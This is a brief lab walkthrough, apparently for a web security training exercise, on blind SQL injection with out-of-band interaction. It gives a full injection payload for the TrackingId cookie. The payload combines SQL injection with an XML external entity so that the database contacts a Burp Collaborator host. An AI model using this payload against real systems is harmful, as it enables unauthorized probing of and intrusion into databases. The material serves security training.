# Lab: Blind SQL injection with out-of-band interaction

Open burp collaborator and copy the payload.

Load the front page of the shop intercept the request. Modify the TrackingId cookie as follows to trigger an interaction with the collaborator client (also using XXE techniques):

`TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//<collaborator-id>.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--`